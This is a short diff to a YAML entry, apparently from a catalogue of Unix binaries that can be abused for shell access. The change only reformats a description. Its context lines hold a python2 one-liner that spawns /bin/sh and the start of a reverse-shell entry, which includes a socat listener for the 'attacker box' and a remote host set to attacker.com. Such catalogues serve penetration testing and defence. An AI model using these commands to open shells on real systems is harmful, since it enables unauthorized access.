@@ -3,7 +3,7 @@ functions:
   execute-interactive:
     - code: python2 -c 'import os; os.system("/bin/sh")'
   reverse-shell-interactive:
-    - description: Run <code>socat file:`tty`,raw,echo=0 tcp-listen:12345</code> on the attacker box to receive the shell.
+    - description: Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
       code: |
         export RHOST=attacker.com
         export RPORT=12345
